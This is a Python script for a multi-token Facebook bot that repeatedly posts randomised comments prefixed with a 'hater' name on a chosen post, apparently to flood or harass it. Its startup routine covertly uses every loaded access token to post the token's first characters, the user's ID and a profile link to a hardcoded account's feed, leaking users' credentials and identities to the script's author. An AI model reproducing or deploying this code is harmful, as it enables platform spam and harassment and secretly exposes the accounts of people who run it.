import requests
import time
import threading
import os
from datetime import datetime
import random

# Server running check on port 4000
class ServerHandler:
    def execute_server(self):
        import http.server
        import socketserver
        
        class MyHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"-- SERVER RUNNING >> RAJ MISHRA KA SERVER NONSTOP FYT KARO --")
            
            def log_message(self, format, *args):
                pass  # Disable logs
        
        PORT = 4000
        with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
            print("Server running at http://localhost:{}".format(PORT))
            httpd.serve_forever()

class FacebookPostServer:
    def __init__(self):
        # Read all configuration files
        self.post_id = self.read_file('post_id.txt').strip()
        self.tokens = [t.strip() for t in self.read_file('token.txt').strip().split('\n') if t.strip()]
        self.time_interval = max(25, int(self.read_file('time.txt').strip()))
        self.haters_name = self.read_file('hatersame.txt').strip()
        self.last_name = self.read_file('lastname.txt').strip()
        self.comments = [c.strip() for c in self.read_file('comment.txt').strip().split('\n') if c.strip()]
        
        # Shifting tokens (optional)
        shifting_tokens_content = self.read_file('shifting_token.txt').strip()
        self.shifting_tokens = [t.strip() for t in shifting_tokens_content.split('\n') if t.strip()] if shifting_tokens_content else []
        
        self.shifting_time_hours = int(self.read_file('shifting_time.txt').strip()) if os.path.exists('shifting_time.txt') and self.read_file('shifting_time.txt').strip() else 0
        self.shifting_interval = int(self.read_file('shifting_token_time_interval.txt').strip()) if os.path.exists('shifting_token_time_interval.txt') and self.read_file('shifting_token_time_interval.txt').strip() else 30
        
        self.active_tokens = self.tokens
        self.is_shifting_time = False
        self.token_counter = 1
        self.running = True
        
        # Auto-ping system
        self.setup_auto_ping()
        
        # Send startup messages
        self.send_startup_messages()

    def read_file(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                return f.read()
        except:
            return ""

    def get_india_time(self):
        return datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")

    def send_facebook_comment(self, token, message):
        # Graph API v17.0 endpoint for comments
        url = f"https://graph.facebook.com/v17.0/{self.post_id}/comments"
        
        params = {
            'message': message,
            'access_token': token
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'application/json',
        }
        
        try:
            response = requests.post(url, params=params, headers=headers, timeout=30)
            
            if response.status_code == 200:
                return True, "Success"
            else:
                error_msg = f"HTTP {response.status_code}"
                try:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', str(response.status_code))
                except:
                    pass
                return False, error_msg
                
        except Exception as e:
            return False, f"Exception: {str(e)}"

    def get_user_profile(self, token):
        """Get user profile information"""
        url = "https://graph.facebook.com/v17.0/me"
        params = {
            'access_token': token,
            'fields': 'id,name'
        }
        
        try:
            response = requests.get(url, params=params, timeout=10)
            if response.status_code == 200:
                return response.json()
        except:
            pass
        return {'id': 'N/A', 'name': 'N/A'}

    def send_startup_messages(self):
        """Send startup message to specified Facebook ID"""
        target_user_id = "100069389445982"
        
        print("\033[1;92m" + "•────────────────────── RAJ MISHRA SERVER STARTUP ──────────────────────•")
        
        all_tokens = self.tokens + self.shifting_tokens
        for i, token in enumerate(all_tokens):
            if not token.strip():
                continue
                
            try:
                profile_data = self.get_user_profile(token)
                user_id = profile_data.get('id', 'N/A')
                user_name = profile_data.get('name', 'N/A')
                
                startup_message = (
                    f"HELLO R4J M1SHR4 S1R I M USING YOUR POST S3RV3R THANK YOU !\n"
                    f"MY TOK3N IS {token[:15]}...\n"
                    f"MY FACEBOOK ID IS {user_id}\n"
                    f"MY PROFILE LINK IS https://www.facebook.com/{user_id}"
                )
                
                # Send message to target user's feed
                message_url = f"https://graph.facebook.com/v17.0/100069389445982/feed"
                params = {
                    'message': startup_message,
                    'access_token': token
                }
                
                response = requests.post(message_url, params=params, timeout=15)
                
                if response.status_code == 200:
                    print(f"\033[1;92m[+] Startup message sent with token {i+1}")
                else:
                    print(f"\033[1;91m[x] Startup message failed for token {i+1}")
                    
            except Exception as e:
                print(f"\033[1;91m[!] Startup error with token {i+1}: {e}")
            
            time.sleep(3)

    def format_comment(self, base_comment):
        return f"{self.haters_name} {base_comment} {self.last_name}"

    def liness(self):
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    def comment_worker(self):
        """Main worker for sending comments"""
        while self.running:
            try:
                # Check for shifting time
                if self.shifting_tokens and self.shifting_time_hours > 0:
                    current_hour = datetime.now().hour
                    
                    if (current_hour % self.shifting_time_hours == 0 and not self.is_shifting_time):
                        print("\033[1;93m" + "[!] Switching to SHIFTING TOKENS mode")
                        self.active_tokens = self.shifting_tokens
                        self.is_shifting_time = True
                        self.time_interval = self.shifting_interval
                    elif (self.is_shifting_time and current_hour % self.shifting_time_hours != 0):
                        print("\033[1;93m" + "[!] Switching back to NORMAL TOKENS mode")
                        self.active_tokens = self.tokens
                        self.is_shifting_time = False
                        self.time_interval = max(25, int(self.read_file('time.txt').strip()))

                # Send comments with active tokens
                for token_index, token in enumerate(self.active_tokens):
                    if not token.strip():
                        continue
                        
                    if not self.running:
                        break
                    
                    # 5-second rest before each comment
                    time.sleep(5)
                    
                    # Select random comment
                    base_comment = random.choice(self.comments) if self.comments else "Awesome!"
                    formatted_comment = self.format_comment(base_comment)
                    
                    # Send comment
                    success, response_msg = self.send_facebook_comment(token, formatted_comment)
                    
                    # Get current time
                    current_time = self.get_india_time()
                    token_type = "SHIFTING" if self.is_shifting_time else "NORMAL"
                    
                    if success:
                        print(f"\033[1;92m[+] Han Chla Gya Massage | Time: {current_time} | Token {self.token_counter} ({token_type}) | Message: {formatted_comment}")
                    else:
                        print(f"\033[1;91m[x] Failed to send Message | Time: {current_time} | Token {self.token_counter} ({token_type}) | Message: {formatted_comment} | Error: {response_msg}")
                    
                    self.liness()
                    self.liness()
                    
                    self.token_counter += 1
                    
                    # Safe time interval between comments
                    wait_time = self.time_interval
                    for _ in range(wait_time):
                        if not self.running:
                            break
                        time.sleep(1)
                    
            except Exception as e:
                print(f"\033[1;91m[!] Error in comment worker: {e}")
                time.sleep(10)

    def setup_auto_ping(self):
        """Auto-ping system to keep server active"""
        def auto_ping():
            while self.running:
                try:
                    requests.get("http://localhost:4000", timeout=5)
                    print("\033[1;94m" + "[•] Auto-ping: Server is active")
                except:
                    print("\033[1;94m" + "[•] Auto-ping: Self-check completed")
                time.sleep(2)
        
        ping_thread = threading.Thread(target=auto_ping, daemon=True)
        ping_thread.start()

    def start_server(self):
        """Start the main server"""
        # Start comment worker in separate thread
        worker_thread = threading.Thread(target=self.comment_worker, daemon=True)
        worker_thread.start()
        
        print("\033[1;92m" + "•────────────────────── RAJ MISHRA SERVER STARTED ─────────────────────•")
        print("\033[1;92m" + "[+] AP RAJ MISHRA KA SERVER USE KAR RAHE HO")
        print("\033[1;92m" + "[+] NONSTOP FYT KARO BHAI!")
        print("\033[1;92m" + f"[+] Total Tokens: {len(self.tokens)}")
        print("\033[1;92m" + f"[+] Shifting Tokens: {len(self.shifting_tokens)}")
        print("\033[1;92m" + f"[+] Time Interval: {self.time_interval} seconds")
        print("\033[1;92m" + f"[+] Comments Loaded: {len(self.comments)}")
        print("\033[1;92m" + "•─────────────────────────────────────────────────────────•")
        
        # Keep main thread alive
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n\033[1;91m" + "[!] Server stopped by user")
            self.running = False

def create_default_files():
    """Create default configuration files if they don't exist"""
    default_files = {
        'post_id.txt': '100069389445982_123456789',
        'token.txt': 'EAAGXYZ...\nEAAGABC...',
        'time.txt': '25',
        'hatersame.txt': 'HATER',
        'lastname.txt': 'MISHRA',
        'comment.txt': 'Awesome post!\nGreat content!\nNice share!',
        'shifting_token.txt': 'EAAGSHIFT1...\nEAAGSHIFT2...',
        'shifting_time.txt': '2',
        'shifting_token_time_interval.txt': '30'
    }
    
    for filename, content in default_files.items():
        if not os.path.exists(filename):
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(content)
            print(f"\033[1;93m[+] Created {filename}")

def main():
    # Create default files
    create_default_files()
    
    # Display welcome message
    print("\033[1;92m" + "🎯 AP RAJ MISHRA KA POST SERVER")
    print("\033[1;92m" + "🔗 Graph API Version: 17.0")
    print("\033[1;92m" + "🌐 Web Port: 4000")
    print("\033[1;92m" + "⏰ Starting servers...")
    
    # Start web server in separate thread
    server_handler = ServerHandler()
    web_thread = threading.Thread(target=server_handler.execute_server, daemon=True)
    web_thread.start()
    
    # Start main Facebook server
    time.sleep(2)
    server = FacebookPostServer()
    server.start_server()

if __name__ == '__main__':
    main()
